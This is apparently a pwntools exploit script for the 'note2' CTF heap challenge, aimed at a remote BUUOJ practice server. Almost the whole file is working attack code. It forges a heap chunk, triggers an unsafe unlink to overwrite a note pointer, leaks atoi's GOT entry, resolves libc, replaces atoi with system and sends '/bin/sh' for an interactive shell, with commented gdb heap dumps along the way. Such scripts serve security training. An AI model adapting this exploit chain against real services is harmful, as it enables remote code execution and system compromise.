#-*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 27351)
# io = process("./note2")


def add(length, content):
    io.recvuntil('option--->>')
    io.sendline('1')
    io.recvuntil('(less than 128)')
    io.sendline(str(int(length)))
    io.recvuntil('content:')
    io.sendline(content)


def show(id):
    io.recvuntil('option--->>')
    io.sendline('2')
    io.recvuntil('note:')
    io.sendline(str(id))


def edit(id, choice, s):
    io.recvuntil('option--->>')
    io.sendline('3')
    io.recvuntil('note:')
    io.sendline(str(id))
    io.recvuntil('2.append]')
    io.sendline(str(choice))
    io.sendline(s)


def delete(id):
    io.recvuntil('option--->>')
    io.sendline('4')
    io.recvuntil('note:')
    io.sendline(str(id))


io.recvuntil("Input your name:")
io.sendline("melody")
io.recvuntil("Input your address:")
io.sendline("there")


target = 0x602120   # 0
fd = target - 0x18
bk = target - 0x10

payload = 'a' * 8 + p64(0x61)
payload += p64(fd) + p64(bk)
payload += 'b' * 64 + p64(0x60)

add(0x80, payload)  # 0
add(0, "aaaaaaaa")  # 1
add(0x80, "bbbbbbbb")  # 2
'''
gdb-peda$ x/100gx 0x00000000017f0000
0x17f0000:	0x0000000000000000	0x0000000000000091 0
0x17f0010:	0x6161616161616161	0x0000000000000061
0x17f0020:	0x0000000000602108	0x0000000000602110
0x17f0030:	0x6262626262626262	0x6262626262626262
0x17f0040:	0x6262626262626262	0x6262626262626262
0x17f0050:	0x6262626262626262	0x6262626262626262
0x17f0060:	0x6262626262626262	0x6262626262626262
0x17f0070:	0x0000000000000060	0x0000000000000000
0x17f0080:	0x0000000000000000	0x0000000000000000
0x17f0090:	0x0000000000000000	0x0000000000000021 1
0x17f00a0:	0x6161616161616161	0x0000000000000000
0x17f00b0:	0x0000000000000000	0x0000000000000091 2
0x17f00c0:	0x6262626262626262	0x0000000000000000
0x17f00d0:	0x0000000000000000	0x0000000000000000
0x17f00e0:	0x0000000000000000	0x0000000000000000
0x17f00f0:	0x0000000000000000	0x0000000000000000
0x17f0100:	0x0000000000000000	0x0000000000000000
0x17f0110:	0x0000000000000000	0x0000000000000000
0x17f0120:	0x0000000000000000	0x0000000000000000
0x17f0130:	0x0000000000000000	0x0000000000000000
0x17f0140:	0x0000000000000000	0x0000000000020ec1
'''

# edit the chunk1 to overwrite the chunk2
delete(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
add(0, content)
# delete note 2 to trigger the unlink
# after unlink, ptr[0] = ptr - 0x18
delete(2)
'''
gdb-peda$ x/100gx 0x1d80000
0x1d80000:	0x0000000000000000	0x0000000000000091 0
0x1d80010:	0x6161616161616161	0x0000000000020ff1
0x1d80020:	0x0000000000602108	0x0000000000602110
0x1d80030:	0x6262626262626262	0x6262626262626262
0x1d80040:	0x6262626262626262	0x6262626262626262
0x1d80050:	0x6262626262626262	0x6262626262626262
0x1d80060:	0x6262626262626262	0x6262626262626262
0x1d80070:	0x0000000000000060	0x0000000000000000
0x1d80080:	0x0000000000000000	0x0000000000000000
0x1d80090:	0x0000000000000000	0x0000000000000021 3
0x1d800a0:	0x6161616161616161	0x6161616161616161
0x1d800b0:	0x00000000000000a0	0x0000000000000090
0x1d800c0:	0x6262626262626200	0x0000000000000000
0x1d800d0:	0x0000000000000000	0x0000000000000000
0x1d800e0:	0x0000000000000000	0x0000000000000000
0x1d800f0:	0x0000000000000000	0x0000000000000000
0x1d80100:	0x0000000000000000	0x0000000000000000
0x1d80110:	0x0000000000000000	0x0000000000000000
0x1d80120:	0x0000000000000000	0x0000000000000000
0x1d80130:	0x0000000000000000	0x0000000000000000
0x1d80140:	0x0000000000000000	0x0000000000020ec1
'''
'''
gdb-peda$ x/10gx 0x602120
0x602120:	0x0000000000602108	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000001d800a0
'''


atoi_got = 0x602088
payload2 = "a"*0x18
payload2 += p64(atoi_got)
edit(0, 1, payload2)
show(0)


io.recvuntil("Content is ")
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))


libc = LibcSearcher("atoi", addr)
base = addr - libc.dump("atoi")
system = base + libc.dump("system")
edit(0, 1, p64(system))

io.recvuntil('option--->>')
io.sendline('/bin/sh')


# gdb.attach(io)
# raw_input()


io.interactive()